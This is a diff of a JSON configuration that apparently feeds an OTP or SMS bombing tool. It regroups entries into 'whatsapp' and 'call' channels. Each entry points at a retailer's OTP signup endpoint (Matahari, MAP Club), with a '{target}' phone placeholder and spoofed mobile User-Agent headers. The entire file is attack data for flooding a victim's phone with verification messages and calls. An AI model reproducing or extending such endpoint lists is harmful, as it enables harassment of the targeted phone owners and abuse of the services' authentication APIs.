@@ -1,22 +1,25 @@
-[
-  {
-    "name": "MATAHARI-FRESH",
-    "url": "https://api.matahari.com/v1/auth/otp",
-    "method": "POST",
-    "data": {"phone": "{target}", "type": "register"},
-    "headers": {
-      "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-      "Content-Type": "application/json"
+{
+  "whatsapp": [
+    {
+      "name": "MATAHARI-WA",
+      "url": "https://api.matahari.com/v1/auth/otp",
+      "method": "POST",
+      "data": {"phone": "{target}", "type": "register"},
+      "headers": {
+        "User-Agent": "Mozilla/5.0",
+        "Content-Type": "application/json"
+      }
     }
-  },
-  {
-    "name": "MAP-VERIFY",
-    "url": "https://mapclub.com/api/v1/signup/otp",
-    "method": "POST",
-    "data": {"phone": "{target}"},
-    "headers": {
-      "User-Agent": "okhttp/4.9.0",
-      "X-Requested-With": "XMLHttpRequest"
+  ],
+  "call": [
+    {
+      "name": "MAP-CALL",
+      "url": "https://mapclub.com/api/v1/signup/otp",
+      "method": "POST",
+      "data": {"phone": "{target}"},
+      "headers": {
+        "User-Agent": "okhttp/4.9.0"
+      }
     }
-  }
-]
+  ]
+}
